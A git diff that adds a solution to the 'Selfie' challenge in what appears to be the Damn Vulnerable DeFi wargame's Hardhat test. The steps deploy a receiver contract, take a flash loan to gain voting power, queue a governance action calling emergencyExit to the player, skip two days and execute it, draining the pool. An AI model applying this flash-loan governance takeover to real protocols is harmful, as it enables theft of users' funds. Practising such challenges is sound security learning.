@@ -39,6 +39,22 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // 1 Receiver
+            // run() save actionId
+            // 1.1. FlashLoan 1.5M
+            // receive(amount)
+            // 1.2. actionId = queueAction(target=selfiePool, value=0, data=emergencyExit(address receiver=player)
+            // 1.3. approve(spender=selfiePool, amount=amount)
+        // 2. Skip time 2 days
+        // 3. Call executeAction(actionId)
+        receiver = await (await ethers.getContractFactory('SelfieReceiver', player)).deploy(pool.address, token.address, governance.address, player.address);
+        await receiver.run();
+        console.log("run")
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        const actionId = await receiver.actionId();
+        console.log("actionId", actionId.toString());
+        await governance.executeAction(actionId);
     });
 
     after(async function () {
